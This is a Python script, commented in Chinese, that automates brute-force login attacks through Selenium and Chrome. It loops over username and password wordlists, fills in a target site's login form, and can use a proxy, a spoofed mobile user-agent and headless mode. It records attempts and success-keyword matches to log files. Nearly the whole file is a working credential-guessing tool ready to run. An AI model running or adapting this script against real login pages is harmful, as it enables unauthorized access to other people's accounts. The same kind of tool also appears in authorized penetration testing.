#!/usr/bin/env python
# encoding: utf-8
import time
import sys
sys.dont_write_bytecode = True
from selenium import webdriver
from selenium.webdriver.common import action_chains
from selenium.webdriver.chrome.options import Options
from lib.DataType import config
from lib.InputParse import ParserCmd, remove_dict_none_value_key

if sys.version > '3':
    print('Python3 was used !!! This program supports Python2 and Python3')
else:
    print('Python2 was used !!! This program supports Python2 and Python3')
    sys.reload(sys)
    sys.setdefaultencoding('utf-8')


def SetBrowser(proxy=None, user_agent=None, user_dir=None, chrome_path=None, driver_path=None, headless=False):
    """
    # selenium.webdriver.chrome.options 中add_argument 常用参数表
    # https://blog.csdn.net/qq_42059060/article/details/104522492
    # python+selenium+Chrome options参数
    # https://www.cnblogs.com/yangjintao/p/10599868.html
    # selenium 自动化：指定浏览器和指定驱动（Chrome）
    # https://blog.csdn.net/qq_41030861/article/details/105294133?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-7.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-7.control
    # executable_path 为chromedriver.exe所在地址。
    # chromedriver.exe的下载地址为 http://chromedriver.storage.googleapis.com/index.html
    # 首先需要确定本机的Chrome浏览器的版本，在Chrome浏览器里输入"chrome://version"
    """
    options = Options()

    # 防止打印一些无用的日志
    options.add_experimental_option("excludeSwitches", ['enable-automation', 'enable-logging'])

    # 使用指定代理服务器, 对 http 和 https 有效
    if proxy is not None:
        # proxy ='http://127.0.0.1:8080'
        options.add_argument('--proxy-server=%s' % proxy)

    # 是否使用自定义user-agent
    if not user_agent:
        user_agent = 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; BLA-AL00 Build/HUAWEIBLA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.9 Mobile Safari/537.36'
    options.add_argument('--user-agent=%s' % user_agent)

    # 使用自定义帐户资料夹
    if user_dir is not None:
        # browser_user_dir = "D:\temp\Chrome User Data"
        options.add_argument('user-data-dir=%s' % user_dir)

    # 浏览器不提供可视化页面
    if headless:
        options.add_argument('--headless')

        # 指定chrome.exe所在文件路径 #可添加chrome.exe到系统path环境变量
    if chrome_path is not None:
        # browser_chrome_path =r'C:\Users\Windows\AppData\Roaming\89.0.4389.128\chrome.exe'
        options.binary_location = chrome_path

    # webdriver加载Chrome
    if driver_path is not None:
        # 指定驱动路径加载
        # browser_driver_path = r"chromedriver\chromedriver_win32_89.0.4389.23.exe"
        browser = webdriver.Chrome(executable_path=driver_path, options=options)
        # 使用options替换chrome_options
    else:
        # 默认驱动路径加载
        browser = webdriver.Chrome(options=options)
    print('SetBrowser Initialize Successfully !!!')
    return browser


def browser_get_elem(moudle, browser, elem_find_dict):
    if elem_find_dict["find_element_by_id"] != None:
        elem = browser.find_element_by_id(elem_find_dict["find_element_by_id"])
    elif elem_find_dict["find_element_by_name"] is not None:
        elem = browser.find_element_by_name(elem_find_dict["find_element_by_name"])
    elif elem_find_dict["find_element_by_class_name"] is not None:
        elem = browser.find_element_by_class_name(elem_find_dict["find_element_by_class_name"])
    elif elem_find_dict["find_element_by_css_selector"] is not None:
        elem = browser.find_element_by_css_selector(elem_find_dict["find_element_by_css_selector"])
    else:
        elem = None
        print('No {} elem, browser.quit and sys.exit!!!'.format(moudle))
        browser.quit()
        sys.exit()
    return elem


def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
               user_id=None, user_class=None, user_name=None,user_css_selector=None,
               pass_id=None, pass_class=None, pass_name=None,pass_css_selector=None,
               button_id=None, button_class=None, button_name=None,button_css_selector=None,
               keyword='success'):
    try:
        action = action_chains.ActionChains(browser)
        browser.get(login_url)

        time.sleep(time_1)  # 延迟时间
        # implicitly_wait 隐式等待 在尝试发现某个元素的时候，如果没能立刻发现，就等待固定长度的时间。
        # browser.implicitly_wait(5) #implicitly_wait 隐式等待   #报错提示服务器时间未同步
        # browser.refresh() # 刷新方法 refresh
        # browser.implicitly_wait(5) #implicitly_wait 隐式等待

        moudle = 'Username'
        elem_find_dict = {'find_element_by_id': user_id,
                          'find_element_by_name': user_name,
                          'find_element_by_class_name': user_class,
                          'find_element_by_css_selector': user_css_selector
                          }
        elem = browser_get_elem(moudle, browser, elem_find_dict)

        if elem:
            # 填充账号
            elem.send_keys(user)
            action.perform()

        moudle = 'Password'
        elem_find_dict = {'find_element_by_id': pass_id,
                          'find_element_by_name': pass_name,
                          'find_element_by_class_name': pass_class,
                          'find_element_by_css_selector': pass_css_selector
                          }
        elem = browser_get_elem(moudle, browser, elem_find_dict)
        if elem:
            # 填充密码
            elem.send_keys(pwd)
            action.perform()

        module = 'Button'
        elem_find_dict = {'find_element_by_id': button_id,
                          'find_element_by_name': button_name,
                          'find_element_by_class_name': button_class,
                          'find_element_by_css_selector': button_css_selector
                          }
        elem = browser_get_elem(module, browser, elem_find_dict)
        if elem:
            # 点击按钮
            elem.click()

        # 等待加载完成
        time.sleep(time_2)  # Explicit Waits 显示等待
        # 获取当前页面的窗口句柄
        # print(browser.current_window_handle)
        # 获取当前页面URL
        currentPageUrl = browser.current_url
        # print('current Page Url:', currentPageUrl)
        # 获取当前页面title
        currentPageTitle = browser.title
        # print('current Page Title:', currentPageTitle)
        # 获取当前页面的源码并断言
        pageSourceSize = len(browser.page_source)
        # print('current Page Size:', pageSourceSize)
        brute_Log = "{}|{}|{}|{}|{}".format(user, pwd, str(currentPageUrl), str(currentPageTitle), str(pageSourceSize))
        print('[*] 访问结果: {}'.format(brute_Log))
        f_BruteLog = open("Brute-Log.txt", "a+")
        f_BruteLog.write(brute_Log + '\n')
        f_BruteLog.close()

        # 自定义匹返回页面匹配关键字
        if keyword in browser.page_source:
            keyword_result = "{}|{}|{} 成功匹配到登录成功关键字: {}".format(user, pwd, str(currentPageUrl), keyword)
            print('[+] 匹配结果: {}'.format(keyword_result))
            f_Success = open("Brute-Keyword.txt", "a+")
            f_Success.write(keyword_result + '\n')
            f_Success.close()

        else:
            keyword_result = '{}|{}|{} 没有匹配到登录成功关键字: {} '.format(user, pwd, str(currentPageUrl), keyword)
            print('[-] 匹配结果: {}'.format(keyword_result))

    except KeyboardInterrupt as error:
        print('[-] KeyboardInterrupt:{}'.format(error))
        browser.quit()
        exit()

    except Exception as error:
        print('[!] 发生异常,Exception:{}'.format(error))
        browser.quit()
        exit()


def BatchBruteLogin(login_url=None, time_1=1, time_2=1,
                    user_id=None, user_name=None,user_class=None,user_css_selector=None,
                    pass_id=None, pass_name=None, pass_class=None,pass_css_selector=None,
                    button_id=None,button_name=None, button_class=None,button_css_selector=None,
                    user_dict='username.txt', pass_dict='password.txt', keyword='success'):
    with open(user_dict, 'r', ) as fuser:
        for user in fuser.readlines():
            user = user.strip()
            with open(pass_dict, 'r') as fpwd:
                for pwd in fpwd.readlines():
                    pwd = pwd.strip()
                    print('[*] 开始测试: {},{}'.format(user, pwd))
                    BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
                               user_id=user_id, user_name=user_name, user_class=user_class, user_css_selector=user_css_selector,
                               pass_id=pass_id, pass_name=pass_name, pass_class=pass_class, pass_css_selector=pass_css_selector,
                               button_id=button_id, button_name=button_name, button_class=button_class, button_css_selector=button_css_selector,
                               keyword=keyword)


if __name__ == '__main__':
    # 解析命令行参数
    args = ParserCmd().init()

    # 对于默认为None和Flase的参数需要进行忽略,这种情况下,所有参数的默认输入值必须设置为（None和Flase）,这两种值的情况下就会调用默认值
    remove_dict_none_value_key(args)

    # 将用户输入的参数传递到config(全局字典变量) #解析命令行功能时会覆盖setting.py中的配置文件参数
    config.update(args)

    # 对输入的目标数量进行判断和处理
    if not config.login_url:
        print("[-] 未输入任何有效目标,即将退出程序...")
        sys.exit()

    try:
        # 设置浏览器
        browser = SetBrowser(proxy=config.browser_proxy, user_agent=config.browser_useragent,
                             user_dir=config.browser_user_dir, chrome_path=config.browser_chrome_path,
                             driver_path=config.browser_driver_path, headless=config.browser_headless)
    except Exception as error:
        print("[!] 注意: 浏览器设置发生错误,错误内容：{} ,即将退出程序...".format(error))
        sys.exit()

    try:
        # 开始进行批量爆破
        BatchBruteLogin(login_url=config.login_url, time_1=config.time_1, time_2=config.time_2,
                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name,user_css_selector=config.user_css_selector,
                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name,pass_css_selector=config.pass_css_selector,
                        button_id=config.button_id, button_class=config.button_class, button_name=config.button_name, button_css_selector=config.button_css_selector,
                        user_dict=config.user_dict, pass_dict=config.pass_dict, keyword=config.keyword)
    except Exception as error:
        print("[!] 注意:爆破模块发生错误,错误内容：{}".format(error))
    finally:
        browser.quit()
        sys.exit()
